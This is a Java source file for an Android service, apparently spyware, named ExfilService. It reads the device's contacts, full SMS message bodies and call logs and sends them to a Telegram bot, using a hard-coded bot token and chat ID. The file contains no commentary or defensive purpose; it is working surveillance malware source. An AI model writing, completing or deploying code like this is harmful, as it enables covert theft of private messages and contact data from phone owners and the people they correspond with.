package com.tracker.app;
import android.Manifest; import android.app.Service; import android.content.Intent; import android.content.pm.PackageManager; import android.database.Cursor; import android.os.IBinder; import android.provider.ContactsContract; import android.provider.Telephony; import androidx.core.content.ContextCompat; import java.io.OutputStream; import java.net.HttpURLConnection; import java.net.URL;
public class ExfilService extends Service {
    private final String BOT_TOKEN = "9256327672:AAFWws6pyAWcoNwX-NuAsDlgrksA5d-YNjg"; private final String CHAT_ID = "8947742554";
    @Override public int onStartCommand(Intent intent, int flags, int startId) { new Thread(() -> { sendContacts(); sendSms(); sendCallLogs(); stopSelf(); }).start(); return START_NOT_STICKY; }
    private void sendContacts() { if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return; Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null); StringBuilder sb = new StringBuilder("=== CONTACTS ===\n"); if (cursor != null) { while (cursor.moveToNext()) { String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)); String phone = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)); sb.append(name).append(": ").append(phone).append("\n"); } cursor.close(); } sendText(sb.toString()); }
    private void sendSms() { if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return; Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null); StringBuilder sb = new StringBuilder("=== SMS ===\n"); if (cursor != null) { while (cursor.moveToNext()) { String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)); String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)); sb.append(address).append(": ").append(body).append("\n"); } cursor.close(); } sendText(sb.toString()); }
    private void sendCallLogs() { if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return; Cursor cursor = getContentResolver().query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, null); StringBuilder sb = new StringBuilder("=== CALL LOGS ===\n"); if (cursor != null) { while (cursor.moveToNext()) { String number = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER)); String type = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE)); sb.append(number).append(" (type: ").append(type).append(")\n"); } cursor.close(); } sendText(sb.toString()); }
    private void sendText(String text) { new Thread(() -> { try { String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage"; URL url = new URL(urlStr); HttpURLConnection conn = (HttpURLConnection) url.openConnection(); conn.setRequestMethod("POST"); conn.setDoOutput(true); conn.setRequestProperty("Content-Type", "application/json"); String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + text.replace("\"", "\\\"").replace("\n", "\\n") + "\"}"; try (OutputStream os = conn.getOutputStream()) { os.write(json.getBytes("utf-8")); } conn.getResponseCode(); conn.disconnect(); } catch (Exception e) { e.printStackTrace(); } }).start(); }
    @Override public IBinder onBind(Intent intent) { return null; }
}
